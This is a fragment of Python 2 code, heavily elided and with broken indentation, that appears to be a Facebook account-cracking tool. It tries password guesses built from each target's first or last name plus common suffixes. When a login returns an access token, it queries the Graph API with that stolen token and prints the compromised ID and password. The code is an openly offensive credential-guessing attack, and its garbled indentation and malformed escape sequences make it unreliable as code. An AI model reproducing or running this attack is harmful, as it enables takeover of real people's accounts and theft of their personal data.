	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b#80FF00[37;1m SUCCESS'											
				print '\x1b#80FF00[37;1mNAWE >>> '+ b['name']											
				print '\x1b#80FF00[37;1mID >>>' + user											
				print '\x1b#80FF00[37;1mPASS >>>' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[37;1mCheck-Point'
				    print '\x1b[37;1m NAWE >>> ' + b ['name']
				    print '\x1b[37;1mID >>> ' + user
				    print '\x1b[37;1mPASS>>> ' + pass1 + '\n'
				    ...
				    pass2 = b['first_name'] + '1212'										
			            ...
			            if 'access_token' in q:	
				            ...
				            print '\x1b#80FF00[37;1mID >>>' + user											
				            print '\x1b#80FF00[37;1mPASS >>>' + pass2 + '\n'													
					       ...
					       if 'access_token' in q:	
						       ...
						       print '\x1b#80FF00[37;1m SUCCESS'											
				                       print '\x1b#80FF00[37;1mNAWE >>> '+ b['name']											
				                       print '\x1b#80FF00[37;1mID >>>' + user											
				                       print '\x1b#80FF00[37;1mPASS >>>' + pass3 + '\n'									
						       oks.append(user+pass3)
						           ...
						           pass4 = b['first_name'] + '12345@@'											
						                   ...
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   ...
				                                   print '\x1b#80FF00[37;1mNAWE >>> '+ b['name']											
				                                   print '\x1b#80FF00[37;1mID>>>' + user											
				                                   print '\x1b#80FF00[37;1mPASS>>>' + pass4  + '\n'											
						                       ...
						                       if 'access_token' in q:	
						                               ...
						                               print '\x1b#80FF00[37;1m SUCCESS'											
				                                               print '\x1b#80FF00[37;1mNAWE >>> '+ b['name']											
				                                               print '\x1b#80FF00[37;1mID >>>' + user											
				                                               print '\x1b#80FF00[37;1mPASS >>>' + pass5  + '\n'							
							                           ...
							                           pass6 = '1122334455'											
								                           ...
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           ...
				                                                           print '\x1b#80FF00[37;1mNAWE >>> '+ b['name']											
				                                                           print '\x1b#80FF00[37;1mID>>>' + user											
				                                                           print '\x1b#80FF00[37;1mPASS >>>' + pass6  + '\n'											
								                               ...
								                               if 'access_token' in q:		
									                               ...
									                               print '\x1b#80FF00[37;1m SUCCESS'											
				                                                                       print '\x1b#80FF00[37;1mNAWE >>> '+ b['name']											
				                                                                       print '\x1b#80FF00[37;1mID >>>' + user											
				                                                                       print '\x1b#80FF00[37;1mPASS>>>' + pass7  + '\n'					
										                           ...
										                           pass8 = b['last_name'] + '12345678'											
										                                   ...
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   ...
				                                                                                   print '\x1b#80FF00[37;1mNAWE >>> '+ b['name']											
				                                                                                   print '\x1b#80FF00[37;1mID >>> ' + user											
				                                                                                   print '\x1b#80FF00[37;1mPASS>>>' + pass8  + '\n'			
										                                       ...
										                                       if 'access_token' in q:		
											                                       ...
											                                       print '\x1b#80FF00[37;1m SUCCESS'											
				                                                                                               print '\x1b#80FF00[37;1mNAWE >>> '+ b['name']											
				                                                                                               print '\x1b#80FF00[37;1mID >>>' + user											
				                                                                                               print '\x1b#80FF00[37;1mPASS >>>' + pass9  + '\n'			
